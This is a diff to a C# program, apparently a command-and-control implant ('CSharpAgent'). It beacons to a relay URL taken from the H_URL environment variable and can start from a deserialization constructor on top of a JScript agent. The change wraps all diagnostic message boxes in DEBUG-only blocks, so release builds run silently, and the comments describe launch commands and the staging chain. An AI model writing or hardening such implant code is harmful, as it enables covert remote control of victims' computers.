@@ -43,23 +43,27 @@ namespace CSharpAgent
             if (_entered) return;
             _entered = true;
 
+#if DEBUG
             // [1] — proves the type initialized and the body is running (exe entry OR
-            // deserialization ctor; if a Win7 run dies BEFORE this box, the failure is in
+            // deserialization ctor; if a Win7 run dies BEFORE this line, the failure is in
             // type init itself — JIT/permission/mask — not in the beacon).
             Diag.Show("[1] start", "process started — type initialized, Main entered");
+#endif
 
             var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
             if (string.IsNullOrEmpty(beaconUrl))
             {
-                // [exit] — the silent exit most likely behind "runs then exits": the exe
-                // was launched without H_URL in its environment.
+#if DEBUG
+                // The silent exit that WAS "runs then exits": launched without H_URL.
                 Diag.Show("[exit] no H_URL",
-                    "H_URL is not set — nothing to beacon, returning.\n" +
-                    "Launch from a shell that has it:\n" +
-                    "  set H_URL=https://<relay>/ && csharp-agent-<net2>-<arch>.exe");
+                    "H_URL is not set — nothing to beacon, returning. Launch from a shell " +
+                    "that has it: set H_URL=https://<relay>/ && csharp-agent-<net2>-<arch>.exe");
+#endif
                 return;
             }
+#if DEBUG
             Diag.Show("[2] H_URL", beaconUrl);
+#endif
 
             // A URL never legitimately carries control/format chars or edge whitespace —
             // a copy-pasted H_URL with an invisible U+200B or a cmd `&&` trailing space
@@ -73,15 +77,19 @@ namespace CSharpAgent
             }
             if (wireUrl.Length == 0)
             {
+#if DEBUG
                 Diag.Show("[exit] H_URL blank", "H_URL carried only whitespace/control chars — nothing to beacon");
+#endif
                 return;
             }
 
             Beacon.Run(wireUrl);
+#if DEBUG
             Diag.Show("[exit] Run returned",
-                "Beacon.Run returned — a fatal transport/protocol exit (see the last " +
-                "[exit] caption above this one, if any). Process ends; the JScript agent " +
-                "underneath resumes when this run was a deserialization.");
+                "Beacon.Run returned — a fatal transport/protocol exit (see the last [exit] " +
+                "line above this one, if any). Process ends; the JScript agent underneath " +
+                "resumes when this run was a deserialization.");
+#endif
         }
     }
 }
